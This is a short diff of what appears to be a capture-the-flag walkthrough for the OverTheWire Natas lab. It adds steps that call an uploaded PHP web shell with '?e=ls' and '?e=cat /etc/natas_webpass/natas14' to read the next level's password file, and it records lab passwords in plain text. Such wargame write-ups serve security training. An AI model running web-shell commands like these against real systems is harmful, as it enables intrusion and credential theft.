@@ -23,6 +23,7 @@ Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
   ```
   ![image](https://github.com/user-attachments/assets/fc6dcc16-8861-4e41-8c8d-5ee8f5846fa3)
   ![image](https://github.com/user-attachments/assets/d5e520aa-77ef-4337-89f7-98b81bac8afc)
-
-
-- Password: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
+  ![image](https://github.com/user-attachments/assets/a811ae7c-046b-4e0c-b144-30c8fa48b21f)
+  - Append URL with `?e=ls`: `http://natas13.natas.labs.overthewire.org/upload/oazgfldi85.php?e=ls` and then `http://natas13.natas.labs.overthewire.org/upload/oazgfldi85.php?e=cat%20/etc/natas_webpass/natas14`
+  ![image](https://github.com/user-attachments/assets/4ce00eaa-62c0-4a50-957c-548ad0f41829)
+- Password: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
